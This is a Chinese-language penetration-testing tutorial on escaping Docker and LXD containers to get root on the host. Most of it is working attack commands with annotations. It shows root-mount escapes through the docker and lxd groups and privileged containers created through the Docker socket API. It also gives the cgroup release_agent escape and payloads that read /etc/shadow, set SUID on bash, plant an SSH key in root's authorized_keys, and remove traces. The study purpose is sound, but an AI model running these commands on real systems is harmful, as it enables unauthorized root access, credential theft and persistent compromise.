## 學習目標

- 識別是否在容器環境中（docker / lxc / k8s）。
- 利用 docker 群組建立特權容器逃逸到主機。
- 利用 lxd 群組掛載主機檔案系統取得 root。
- 找到 docker socket 並通過 API 控制主機。

---

## 理論基礎

| 情境 | 條件 | 利用方式 |
|------|------|---------|
| docker 群組 | 使用者在 docker 群組 | 建立特權容器掛載主機 / |
| docker socket | /var/run/docker.sock 可存取 | curl API 建立特權容器 |
| lxd 群組 | 使用者在 lxd 群組 | 匯入 Alpine 映像建立特權容器 |
| privileged 容器 | 已在特權容器中 | 掛載主機磁碟 → chroot |
| docker.sock 掛入容器 | 容器內有 /var/run/docker.sock | 從容器內控制主機 docker |

## 步驟一：確認容器環境

```bash
# 是否在容器中？
cat /proc/1/cgroup | head -5
# 輸出含 docker 或 lxc → 在容器中
# 正常系統：只有 / 或 system.slice

ls -la /.dockerenv 2>/dev/null
# 存在 → 在 Docker 容器中

cat /etc/hostname
# 容器通常是隨機的短 hash（如 a3f2c1d8e9b0）

# 是否在特權容器中？
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → 幾乎全部能力 → 特權容器
# CapEff: 00000000a80425fb → 普通容器

# 已掛載的主機路徑？
cat /proc/mounts | grep "/ "
# 找非 overlay/proc/sys 的掛載 → 可能是主機目錄

# 檢查是否有 docker socket
ls -la /var/run/docker.sock 2>/dev/null
# 存在且可讀寫 → 可以控制 docker daemon
```

## 方法一：docker 群組 → 特權容器

```bash
# 前提：id 顯示有 docker 群組
id | grep docker

# 方法 A：掛載主機根目錄（最常用）
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# docker run     → 建立並執行容器
# -v /:/mnt      → 把主機的 / 掛載到容器的 /mnt
# --rm           → 執行完自動刪除容器（清理痕跡）
# -it            → 互動式 terminal（-i 保持 stdin，-t 配置 tty）
# alpine         → 使用 Alpine Linux 映像（輕量）
# chroot /mnt sh → 切換 root 到主機的 /，執行 sh
# 結果：在容器中以 root 操作主機完整檔案系統

# 方法 B：建立 SUID shell
docker run -v /:/mnt --rm alpine chmod +s /mnt/bin/bash
# 在主機的 /bin/bash 設定 SUID bit（不進互動模式）
# 之後在主機上：
/bin/bash -p

# 方法 C：讀取 /etc/shadow（不需進 shell）
docker run -v /etc/shadow:/shadow --rm alpine cat /shadow
# -v /etc/shadow:/shadow → 只掛載 shadow 檔案
# cat /shadow → 直接輸出內容

# 方法 D：加 SSH key 到 root
docker run -v /root/.ssh:/root_ssh --rm alpine sh -c \
  "echo 'YOUR_PUB_KEY' >> /root_ssh/authorized_keys"
# 掛載 root 的 .ssh 目錄並添加 SSH 公鑰
```

## 方法二：docker.sock → API 控制

```bash
# 前提：/var/run/docker.sock 可存取（在主機或容器內）
ls -la /var/run/docker.sock
# srw-rw---- root docker → docker 群組可讀寫

# 用 curl 直接呼叫 Docker API（Unix socket）
curl -s --unix-socket /var/run/docker.sock http://localhost/version
# --unix-socket → 使用 Unix socket 連線（非 TCP）
# 確認 docker 版本（確認 API 可用）

# 建立特權容器（透過 API）
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}' | python3 -m json.tool
# Binds → 掛載主機 /
# Privileged → 特權容器

# 取得 container ID 後啟動
CONTAINER_ID="your_container_id"
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CONTAINER_ID/start
# 啟動容器

# 更簡單：若有 docker 指令可用
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# -H unix:// → 指定 docker daemon 位置（socket）
```

## 方法三：lxd 群組 → 特權容器

```bash
# 前提：id 顯示有 lxd 群組
id | grep lxd

# Step 1：準備 Alpine 映像（在 Kali）
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
# 產生 alpine-v3.x-x86_64.tar.gz

# 傳到目標
python3 -m http.server 8080
# 目標下載
wget http://KALI_IP:8080/alpine-v3.x-x86_64.tar.gz

# Step 2：匯入映像
lxc image import ./alpine-v3.x-x86_64.tar.gz --alias myimage
# lxc image import → 匯入 lxc 容器映像
# --alias myimage → 給映像取一個別名

# Step 3：確認 lxd 已初始化
lxd init --auto
# --auto → 使用預設設定自動初始化（快速）

# Step 4：建立並啟動特權容器
lxc init myimage mycontainer -c security.privileged=true
# init  → 建立容器（但不啟動）
# -c security.privileged=true → 特權容器（不限制能力）

lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
# config device add → 添加設備到容器
# disk source=/ → 來源是主機的根目錄
# path=/mnt/root → 掛載到容器的 /mnt/root
# recursive=true → 遞迴掛載

lxc start mycontainer
# 啟動容器

# Step 5：進入容器執行命令
lxc exec mycontainer /bin/sh
# exec → 在容器內執行命令
# 在容器內：
chroot /mnt/root /bin/bash
# 切換到主機根目錄的 bash

# Step 6：加入 root 或讀 shadow
cat /mnt/root/etc/shadow
chmod +s /mnt/root/bin/bash
```

## 方法四：從特權容器逃逸（已在容器內）

```bash
# 前提：在特權容器中（CapEff 全部）

# 掛載主機的 cgroup（特權容器可以）
mkdir /tmp/cgroup
mount -t cgroup -o rdma cgroup /tmp/cgroup
# mount -t cgroup → 掛載 cgroup 類型
# -o rdma → rdma cgroup（在特權容器中可以）

mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
# notify_on_release → 當 cgroup 空了時執行 release_agent

# 取得主機的 root 路徑
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

echo "$host_path/cmd" > /tmp/cgroup/release_agent
# 設定 release_agent 為我們的惡意腳本路徑

# 建立惡意腳本（在主機路徑）
echo '#!/bin/bash' > /cmd
echo "chmod +s /bin/bash" >> /cmd
chmod +x /cmd

# 觸發 cgroup 通知
sh -c 'echo $$ > /tmp/cgroup/x/cgroup.procs'
# 把當前 shell 放入 cgroup，然後立即退出觸發通知

# 等幾秒後確認
ls -la /bin/bash | grep -E "^-rws"
/bin/bash -p
```

## 速查表

```bash
# 確認是否在容器中
ls -la /.dockerenv
cat /proc/1/cgroup | head

# docker 群組提權
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# docker socket
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd 群組提權
lxc image import alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer && lxc exec mycontainer /bin/sh

# 確認特權容器
cat /proc/self/status | grep CapEff
```
